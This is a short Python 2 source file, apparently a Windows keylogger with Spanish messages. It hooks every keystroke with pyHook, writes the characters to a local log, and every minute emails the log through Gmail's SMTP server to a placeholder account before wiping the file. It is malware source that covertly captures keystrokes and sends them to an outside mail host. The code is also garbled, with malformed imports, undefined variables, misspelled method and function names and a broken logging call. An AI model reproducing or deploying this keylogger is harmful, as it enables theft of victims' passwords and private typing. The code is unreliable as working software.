import pyHook, pyhoncom sys, logging
import time datetime

wait_seconds=60
timeout=time.time() + wait_seconds
file_log='C:\\desktop\\dat.txt'

def TimeOut():
    if time.time() > timeout:
        return True
    else:
        return False
def SendEmail(user,pw,recipient, subject, body):
    import smtplib
    gmail_user=user
    gmail_pass=pwd
    TO= recipient if type(recipient) is list else (recipient)
    SUBJECT=subject
    TEXT=body

    message="""\From: %s\nTo: %s/nSubject: %s\n\n%s """
    % (FROM,", ".join(TO), SUBJECT, TEXT)
    try:
        server=smtplib.SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()
        server.login(gmail_user, gmail_pass)
        sever.sendm (FROM, TO, message)
        server.close()
        print 'Correo enviado satisfactoriamente'
    except:
        print 'Error al mandar correo'
def FormatAndSendLogEmail():
    with open(file_log, 'r+') as f:
        actualdate= datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        data= f.read().replace('\n','');
        data='Log capturado a las: '+ actualdate + '\n' + data
        SendEmail('tucorreo@gmail.com', 'tuclave','tucorreo@gmail.com',
                  'Nuevo log -'+ actualdate,data)
        f.seek(0)
        f.truncate()

def OnekeyboardEvent(event):
    logging.basicConfig(file)=file_log, level=logging.DEBUG,
                format='%(message)s'
    logging.log(10, chr(event.Ascci))
    return True
hooks_manager=pyHook.HookManager()
hooks_manager.keyDown=OneKeyboardEvent
hooks_manager.HookKeyboard()

while True:
    if TimeOut():
        FormatAndSendEmail()
        timeout=time.time() + wait_seconds

    pythoncom.PumpWaitingMessages()
